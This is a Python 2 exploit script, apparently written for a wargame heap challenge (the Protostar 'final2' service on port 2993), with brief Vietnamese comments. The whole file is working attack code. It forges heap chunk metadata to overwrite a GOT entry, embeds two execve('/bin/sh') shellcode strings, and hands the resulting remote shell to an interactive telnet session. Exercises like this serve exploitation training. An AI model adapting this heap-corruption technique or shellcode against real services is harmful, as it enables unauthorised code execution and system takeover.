import socket
import telnetlib
import struct

HOST = '172.16.75.129'
PORT = 2993
SIZE = 128

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

def pad(s):
    result = 'FSRD' + s
    return (result + "\x00"*SIZE)[:SIZE] 

#strncmp = 0x804d494 KHONG DUNG ham nay dc vi khi free() thi` program ra khoi vong lap while true
#STRN_12 = struct.pack("I", 0x804d494 - 12)
#write@plt = 0x804d41c
WRITE_12 = struct.pack("I", 0x804d41c - 12)
HEAP_TARGET = struct.pack("I", 0x804e020) #system = 0xb7ecffb0
SYSTEM = struct.pack("I", 0xb7ecffb0)
SHELLCODE = '\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68'
SHELLCODE2 = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
JMP = '\xeb\x0e'

raw_input('[ENTER 1]')
s.send(pad('/ROOT/' + '\x00'*14 + JMP + '\x42'*(16-len(JMP)) + SHELLCODE2 + '/'*128))
raw_input('[ENTER 2]')
fake_heap = struct.pack("I", 0xfffffffc) + struct.pack("I", 0xfffffffc)
fake_heap += WRITE_12 + HEAP_TARGET
s.send(pad('ROOT/'  + '\xfc\xff\xff\xff' + '\xfc\xff\xff\xff' + WRITE_12 + HEAP_TARGET + '\x00'*128))

while(True):
    msg = raw_input('> ')
    if msg:
        payload = pad(msg)
        s.send(payload)
        print 'Message: {}'.format(repr(payload))
    else:
        #s.send('\n')
        #s.recv(1024)
        #s.send('id\n')
        #s.recv(1024)
        t = telnetlib.Telnet()
        t.sock = s
        t.interact()

        s.close()
        print 'Closed connection'
        break



#nho coi lai heap3, heap kho vcl

